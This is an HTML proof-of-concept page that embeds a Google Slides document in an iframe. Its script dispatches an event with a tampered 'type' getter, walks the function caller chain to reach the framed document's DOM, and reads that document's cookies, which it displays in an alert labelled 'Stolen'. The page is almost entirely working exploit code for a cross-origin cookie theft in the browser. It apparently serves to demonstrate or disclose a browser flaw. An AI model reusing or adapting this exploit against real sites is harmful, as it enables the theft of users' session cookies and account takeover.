<html>
  <body>

    <iframe src="https://docs.google.com/presentation/d/16kuVfuipnJOTEAtSSZeOjp02Hv5KkV6isJ17WgML7So/edit#slide=id.p"
      width="400px" height="400px"></iframe>
    <script>

      var ev = new CustomEvent('message');
      var _type = ev.type;
      var childDoc;
      var firstTime = true;

      // Setup the event to re-call the event handler
      Object.defineProperty(ev, 'type', {
        get: function getType() {
          // Make sure we don't loop forever
          if (firstTime) {
            firstTime = false;

            // Get all functions from the child document currently in the stack
            var callers = [getType.caller];
            var lastCaller = getType.caller;
            while (lastCaller.caller !== sendOurEvent) {
              callers.push(lastCaller.caller);
              lastCaller = lastCaller.caller;
            }

            // Traverse everything (starting with the functions) and look for a
            // DOM node. Once found we can get the document element.
            track = [];
            count = 1000;
            var walk = function (obj) {
              count--;
              // Exit if we've hit our limit, have found the child doc or are
              // inspecting the dispatched event (this is pointless)
              if (count < 0 || childDoc || obj === ev) { return; }
              for (k in obj) {
                var val = obj[k];
                var type = typeof val;
                if (type === 'number' || type === 'boolean' || type === 'string') { continue; }
                if (track.indexOf(val) < 0) {
                    track.push(val);
                    // Have we found a DOM element?
                    try { if (val.nodeName) { childDoc = val; } } catch (e) {}
                    // Walking whatever we've found
                    try { walk(val); } catch (e) {}
                }
              }
            }
            walk(callers);

            while (childDoc.parentNode != null) {
              childDoc = childDoc.parentNode;
            }

            alert('Stolen: ' + childDoc.cookie);

          }
          return _type;
        }
      });

      // Dispatch the prepared event on the iframe window
      function sendOurEvent() {
        var iframe = document.getElementsByTagName('iframe')[0];
        window.dispatchEvent.call(iframe.contentWindow, ev);
      }
      // Let the child document load
      setTimeout(sendOurEvent, 4000);

    </script>
  </body>
</html>
